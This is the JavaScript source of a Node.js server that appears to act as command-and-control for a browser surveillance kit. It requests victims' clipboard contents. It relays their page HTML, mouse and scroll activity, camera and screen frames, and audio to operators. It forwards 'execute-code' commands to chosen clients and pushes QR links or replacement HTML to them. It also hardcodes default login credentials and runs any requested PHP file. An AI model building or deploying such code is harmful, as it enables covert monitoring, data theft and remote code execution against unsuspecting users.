const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const { spawn } = require('child_process');
const fs = require('fs');
const crypto = require('crypto');
const bodyParser = require('body-parser');

const app = express();
const server = http.createServer(app);

// Authentication setup
app.use(bodyParser.json());
const activeSessions = {};

// Function to read credentials from file
function getCredentials() {
  try {
    const data = fs.readFileSync(path.join(__dirname, 'auth_config.json'), 'utf8');
    return JSON.parse(data);
  } catch (error) {
    // Default credentials as fallback
    return { username: 'Eden', password: 'Eden' };
  }
}

// Function to generate a random token
function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const credentials = getCredentials();
  
  // Simple plain text comparison (not secure for production)
  if (username === credentials.username && password === credentials.password) {
    // Generate a token
    const token = generateToken();
    const expiresAt = Date.now() + (2 * 60 * 60 * 1000); // 2 hours
    
    // Store the session
    activeSessions[token] = {
      username,
      expiresAt
    };
    
    // Return the token
    res.json({ 
      success: true, 
      token,
      expiresAt
    });
  } else {
    res.status(401).json({ 
      success: false, 
      message: 'Invalid username or password' 
    });
  }
});

// Token verification endpoint
app.post('/verify-token', (req, res) => {
  const { token } = req.body;
  
  if (!token || !activeSessions[token]) {
    return res.status(401).json({ 
      success: false, 
      message: 'Invalid token' 
    });
  }
  
  const session = activeSessions[token];
  
  // Check if token is expired
  if (Date.now() > session.expiresAt) {
    // Remove expired session
    delete activeSessions[token];
    return res.status(401).json({ 
      success: false, 
      message: 'Token expired' 
    });
  }
  
  // Token is valid
  res.json({ 
    success: true, 
    username: session.username 
  });
});

// Logout endpoint
app.post('/logout', (req, res) => {
  const { token } = req.body;
  
  if (token && activeSessions[token]) {
    // Remove the session
    delete activeSessions[token];
  }
  
  res.json({ success: true });
});

// Update credentials endpoint
app.post('/update-credentials', (req, res) => {
  const { username, password, currentPassword } = req.body;
  const credentials = getCredentials();
  
  // Verify current password
  if (currentPassword !== credentials.password) {
    return res.status(401).json({
      success: false,
      message: 'Current password is incorrect'
    });
  }
  
  // Update credentials
  const newCredentials = {
    username: username || credentials.username,
    password: password || credentials.password
  };
  
  try {
    fs.writeFileSync(
      path.join(__dirname, 'auth_config.json'),
      JSON.stringify(newCredentials, null, 2),
      'utf8'
    );
    
    // Invalidate all active sessions
    Object.keys(activeSessions).forEach(key => {
      delete activeSessions[key];
    });
    
    res.json({
      success: true,
      message: 'Credentials updated successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Error updating credentials'
    });
  }
});

// PHP file handler middleware
app.use((req, res, next) => {
    if (req.path.endsWith('.php')) {
        const phpProcess = spawn('php', [path.join(__dirname, req.path)]);
        let output = '';

        phpProcess.stdout.on('data', (data) => {
            output += data.toString();
        });

        phpProcess.stderr.on('data', (data) => {
            console.error(`PHP Error: ${data}`);
        });

        phpProcess.on('close', (code) => {
            if (code === 0) {
                res.send(output);
            } else {
                res.status(500).send('PHP execution failed');
            }
        });
    } else {
        next();
    }
});

// Serve static files from the current directory
app.use(express.static(__dirname));

// Store QR link and client tracking data
let currentQrLink = null;
let clientTrackingData = new Map(); // clientId -> {html, stylesheets, mousePosition, scrollPosition}

// QR update endpoint (called by Python listener)
app.post('/api/qr-update', (req, res) => {
    const { link, timestamp } = req.body;
    console.log('QR update received:', link);
    if (link) {
        currentQrLink = link;
        // Broadcast to all WebSocket clients (both viewers and server.html)
        const qrUpdateMessage = JSON.stringify({
            type: 'qr-link-update',
            link: link,
            timestamp: timestamp
        });
        
        clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                try {
                    client.send(qrUpdateMessage);
                    console.log('QR update sent to client');
                } catch (e) {
                    console.error('Error sending QR update to client:', e);
                }
            }
        });
    }
    res.json({ success: true });
});

// Get current QR link endpoint
app.get('/api/current-qr', (req, res) => {
    res.json({ link: currentQrLink });
});

// Fallback endpoint (called by startup.py when keyword status is RED)
app.post('/api/fallback', (req, res) => {
    const { type, html, url } = req.body;
    
    if (!type) {
        return res.status(400).json({ success: false, error: 'Missing type' });
    }
    
    // Broadcast fallback message to all connected clients (eden.js)
    const fallbackMessage = JSON.stringify({
        type: type,
        html: html || null,
        url: url || null
    });
    
    let sentCount = 0;
    clients.forEach(client => {
        // Only send to client role (eden.js), not viewers or server.html
        if (client.readyState === WebSocket.OPEN && client.role === 'client') {
            try {
                client.send(fallbackMessage);
                sentCount++;
            } catch (e) {
                console.error('Error sending fallback to client:', e);
            }
        }
    });
    
    console.log(`Fallback ${type} sent to ${sentCount} client(s)`);
    res.json({ success: true, sentTo: sentCount });
});

// WebSocket server
const wss = new WebSocket.Server({ server });

let clients = [];
const messageQueue = new Map();

// Handle WebSocket connection
wss.on('connection', function connection(ws) {
    console.log('✅ New client connected');
    clients.push(ws);
    messageQueue.set(ws, { camera: [], screen: [], other: [] });
    ws.clientId = null;
    ws.role = null; // 'client' or 'viewer'

    // Send connection confirmation
    ws.send(JSON.stringify({
        type: 'connection-status',
        status: 'connected',
        timestamp: new Date().toISOString()
    }));
    ws.send(JSON.stringify({ type: 'request-clipboard' }));
    ws.on('message', function incoming(message) {
        ws.lastMessage = message.toString();
        const messageStr = message.toString();
        console.log('📨 Message received:', messageStr.slice(0, 50));

        try {
            // Parse message to check for audio-data
            let parsed;
            try {
                parsed = JSON.parse(messageStr);
            } catch (e) {
                parsed = null;
            }
            
            // Handle authentication-related messages
            if (parsed && parsed.type && parsed.type.includes('auth-')) {
                // Handle authentication messages via WebSocket
                clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN) {
                        client.send(messageStr);
                    }
                });
                return; // Skip other processing for auth messages
            }
            
            // Handle hello message to identify role
            if (parsed && parsed.type === 'hello') {
                ws.role = parsed.role;
                if (parsed.role === 'client') {
                    ws.clientId = parsed.clientId || `client_${Date.now()}`;
                }
                return;
            }
            
            // Handle HTML content and tracking from client
            if (parsed && parsed.type === 'html-content' && (parsed.role === 'client' || !parsed.role)) {
                // Store HTML content for this client
                const clientId = parsed.clientId || ws.clientId;
                if (clientId) {
                    if (!clientTrackingData.has(clientId)) {
                        clientTrackingData.set(clientId, {});
                    }
                    const data = clientTrackingData.get(clientId);
                    data.html = parsed.html || parsed.content;
                    data.timestamp = parsed.timestamp;
                    
                    console.log('Forwarding HTML content from client:', clientId);
                    
                    // Forward to all viewers and server.html (all WebSocket clients except the sender)
                    const forwardMessage = JSON.stringify({
                        type: 'html-content',
                        clientId: clientId,
                        html: parsed.html || parsed.content,
                        content: parsed.html || parsed.content,
                        timestamp: parsed.timestamp
                    });
                    
                    clients.forEach(client => {
                        if (client !== ws && client.readyState === WebSocket.OPEN) {
                            // Send to all clients (viewers and server.html)
                            try {
                                client.send(forwardMessage);
                                console.log('Sent HTML to client');
                            } catch (e) {
                                console.error('Error sending HTML to client:', e);
                            }
                        }
                    });
                }
                return;
            }
            
            // Handle stylesheets from client
            if (parsed && parsed.type === 'stylesheets' && (parsed.role === 'client' || !parsed.role)) {
                const clientId = parsed.clientId || ws.clientId;
                if (clientId) {
                    if (!clientTrackingData.has(clientId)) {
                        clientTrackingData.set(clientId, {});
                    }
                    const data = clientTrackingData.get(clientId);
                    data.stylesheets = parsed.stylesheets || parsed.styleSheets;
                    
                    // Forward to viewers
                    clients.forEach(client => {
                        if (client !== ws && client.readyState === WebSocket.OPEN) {
                            if (client.role === 'viewer' || !client.role) {
                                const forwardMessage = JSON.stringify({
                                    ...parsed,
                                    clientId: clientId
                                });
                                client.send(forwardMessage);
                            }
                        }
                    });
                }
                return;
            }
            
            // Handle mouse position from client
            if (parsed && parsed.type === 'mouse-position' && (parsed.role === 'client' || !parsed.role)) {
                const clientId = parsed.clientId || ws.clientId;
                if (clientId) {
                    if (!clientTrackingData.has(clientId)) {
                        clientTrackingData.set(clientId, {});
                    }
                    const data = clientTrackingData.get(clientId);
                    data.mousePosition = { x: parsed.x, y: parsed.y, clientId: clientId };
                    
                    // Forward to viewers
                    clients.forEach(client => {
                        if (client !== ws && client.readyState === WebSocket.OPEN) {
                            if (client.role === 'viewer' || !client.role) {
                                const forwardMessage = JSON.stringify({
                                    ...parsed,
                                    clientId: clientId
                                });
                                client.send(forwardMessage);
                            }
                        }
                    });
                }
                return;
            }
            
            // Handle scroll position from client
            if (parsed && parsed.type === 'scroll-position' && (parsed.role === 'client' || !parsed.role)) {
                const clientId = parsed.clientId || ws.clientId;
                if (clientId) {
                    if (!clientTrackingData.has(clientId)) {
                        clientTrackingData.set(clientId, {});
                    }
                    const data = clientTrackingData.get(clientId);
                    data.scrollPosition = { scrollX: parsed.scrollX, scrollY: parsed.scrollY };
                    
                    // Forward to viewers
                    clients.forEach(client => {
                        if (client !== ws && client.readyState === WebSocket.OPEN) {
                            if (client.role === 'viewer' || !client.role) {
                                const forwardMessage = JSON.stringify({
                                    ...parsed,
                                    clientId: clientId
                                });
                                client.send(forwardMessage);
                            }
                        }
                    });
                }
                return;
            }
            
            // Handle execute-code from viewer to client
            if (parsed && parsed.type === 'execute-code') {
                // Forward to target client
                clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN && 
                        client.role === 'client' && 
                        (parsed.targetClientId ? client.clientId === parsed.targetClientId : true)) {
                        client.send(messageStr);
                    }
                });
                return;
            }
            
            // Handle tracking-related messages
            if (parsed && parsed.type && ['tracking-control', 'request-content'].includes(parsed.type)) {
                console.log('Processing tracking message:', parsed.type);
                // Forward to target client
                clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN && 
                        client.role === 'client' &&
                        (parsed.targetClientId ? client.clientId === parsed.targetClientId : true)) {
                        client.send(messageStr);
                    }
                });
                return; // Skip regular queue for these messages
            }
            
            // Handle stream data
            if (messageStr.includes('data:image')) {
                const isCamera = messageStr.includes('camera-frame');
                const isScreen = messageStr.includes('screen-frame');
                const queue = messageQueue.get(ws);

                if (isCamera) {
                    queue.camera.push(messageStr);
                    if (queue.camera.length > 2) queue.camera.shift();
                    broadcastMessage(ws, 'camera');
                } else if (isScreen) {
                    queue.screen.push(messageStr);
                    if (queue.screen.length > 2) queue.screen.shift();
                    broadcastMessage(ws, 'screen');
                }
            } else if (messageStr.includes('data:video')) {
                // Handle video recording data
                const isCamera = messageStr.includes('camera-recording');
                const isScreen = messageStr.includes('screen-recording');
                const queue = messageQueue.get(ws);

                if (isCamera) {
                    queue.camera.push(messageStr);
                    broadcastMessage(ws, 'camera');
                } else if (isScreen) {
                    queue.screen.push(messageStr);
                    broadcastMessage(ws, 'screen');
                }
            } else {
                // Check for high priority messages that need immediate processing
                if (parsed && parsed.priority === 'high') {
                    // Immediately relay high priority messages (like refresh responses)
                    if (parsed.refreshResponse) {
                        console.log('Processing high priority refresh response');
                        clients.forEach(client => {
                            if (client !== ws && client.readyState === WebSocket.OPEN) {
                                client.send(messageStr);
                            }
                        });
                        return; // Skip queue for these messages
                    }
                }
                
                if (parsed && parsed.type === 'audio-data') {
                    // Relay audio-data to all other clients
                    clients.forEach(client => {
                        if (client !== ws && client.readyState === WebSocket.OPEN) {
                            client.send(messageStr);
                        }
                    });
                } else if (parsed && parsed.type === 'viewContent') {
                    // Handle view content request
                    clients.forEach(client => {
                        if (client !== ws && client.readyState === WebSocket.OPEN) {
                            client.send(JSON.stringify({
                                type: 'showContent',
                                content: parsed.content,
                                fileName: parsed.fileName
                            }));
                        }
                    });
                } else {
                    // Handle other messages
                    const queue = messageQueue.get(ws);
                    queue.other.push(messageStr);
                    broadcastMessage(ws, 'other');
                }
            }
        } catch (error) {
            console.error('Error processing message:', error);
        }
    });

    ws.on('close', () => {
        console.log('❌ Client disconnected');
        messageQueue.delete(ws);
        if (ws.clientId) {
            clientTrackingData.delete(ws.clientId);
        }
        clients = clients.filter(c => c !== ws);
    });
});

// Function to broadcast messages to all clients
function broadcastMessage(ws, type) {
    const queue = messageQueue.get(ws);
    if (queue && queue[type] && queue[type].length > 0) {
        const message = queue[type].shift();
        clients.forEach(client => {
            if (client !== ws && client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        });
    }
}

// Start server
const PORT = 8080;
server.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
});